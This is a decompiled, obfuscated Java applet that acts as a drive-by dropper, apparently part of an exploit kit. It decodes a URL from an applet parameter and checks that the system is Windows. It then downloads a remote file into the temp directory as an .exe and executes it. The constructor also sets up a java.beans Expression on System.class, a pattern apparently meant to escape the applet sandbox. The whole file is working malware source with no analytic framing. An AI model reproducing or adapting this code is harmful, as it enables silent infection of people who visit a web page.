// 
// Decompiled by Procyon v0.5.30
// 

package lort;

import java.awt.Component;
import java.beans.Expression;
import menu.help;
import menu.file;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import javax.swing.JList;
import java.util.HashSet;
import java.applet.Applet;

public class cooter extends Applet
{
    public String xbxy;
    public Runtime wdwq;
    public int msmvpi;
    public String xbxx;
    public HashSet msmq;
    public JList msmy;
    public String xbxq;
    public String msme;
    public URL msmb;
    public String msma;
    public String msmz;
    public InputStream msmx;
    public String msmc;
    public int msmv;
    public FileOutputStream msmn;
    public String msmm;
    public String msms;
    public String msmd;
    public String xbxa;
    static Class wdwa;
    static Object[] wdwf;
    
    static {
        cooter.wdwa = System.class;
        cooter.wdwf = new Object[1];
    }
    
    private void karamba() {
        border.kubert(this.msmb, object4.openstreamconnection());
        final int msmq = 58;
        final String xbxc = "feh";
        this.msmx = (InputStream)border.kubert(this.msmb, object4.openstrem());
    }
    
    private String liver(final String s) {
        return System.getProperty(s);
    }
    
    private void paprika() throws Exception {
        final boolean xbxz = false;
        this.msmn = new FileOutputStream(this.xbxa);
        final int msmr = 11;
    }
    
    private void tabarda(final Object o) {
        border.kubert(o, object4.close());
    }
    
    public void start() {
        super.start();
        try {
            this.xbxy = "e".concat("xe.");
            this.xbxx = object4.javaiotmpdir();
            this.xbxq = file.pirko(this.getParameter("biint"));
            this.msme = "ema".concat("n.".concat("so"));
            this.msma = object4.kicker(this.xbxy);
            this.msmb = new URL(this.xbxq);
            this.msmz = object4.kicker(this.xbxx);
            this.msmvpi = 24;
            this.msmc = object4.kicker(this.msme);
            this.msmm = object4.batr(this.msma);
            final Runtime runtime = Runtime.getRuntime();
            this.wdwq = runtime;
            if (runtime == null) {}
            this.msms = this.liver(this.msmz);
            final int i = 7;
            this.msmd = this.liver(this.msmc);
            final int k = 15;
            this.xbxa = String.valueOf(this.msms) + this.msmm;
            final int j = 3;
            this.msmv = 1000 + this.msmvpi;
            try {
                if (this.msmd.indexOf("W".concat("in").concat("do".concat("ws"))) < 0) {
                    return;
                }
                this.paprika();
                this.karamba();
                final String xbxk = "ras";
                final byte[] xbxl = new byte[this.msmv];
                int xbxm;
                while ((xbxm = this.msmx.read(xbxl, 0, this.msmv)) != -1) {
                    this.msmn.write(xbxl, 0, xbxm);
                }
                this.tabarda(this.msmx);
                final String xbxp = "irod";
                final int xbxn = 1;
                final boolean xbxo = false;
                this.tabarda(this.msmn);
                final int xbxq = 72;
                final String xbxr = "liko";
                final boolean xbxs = true;
                border.kubert(this.wdwq, object4.ito(), new Object[] { String.valueOf(this.msms) + this.msmm });
                final int xbxu = 112;
                final String xbxy = "lis";
            }
            catch (Exception tyt) {
                tyt.printStackTrace();
            }
        }
        catch (Exception tyt2) {
            tyt2.printStackTrace();
        }
    }
    
    public cooter() {
        this.msmq = new HashSet();
        final boolean wdwb = true;
        final int wdwm = 14;
        final String wdwd = "prf";
        this.msmq.add(new help(cooter.wdwa, object4.piska(), cooter.wdwf));
        final int wdwg = 6;
        final Expression wdwh = new Expression(cooter.wdwa, object4.piska(), cooter.wdwf);
        final boolean wdwu = true;
        final object2 wdwj = new object2(this, this.msmq);
        this.add(this.msmy = new JList((E[])new Object[] { wdwj }));
    }
}
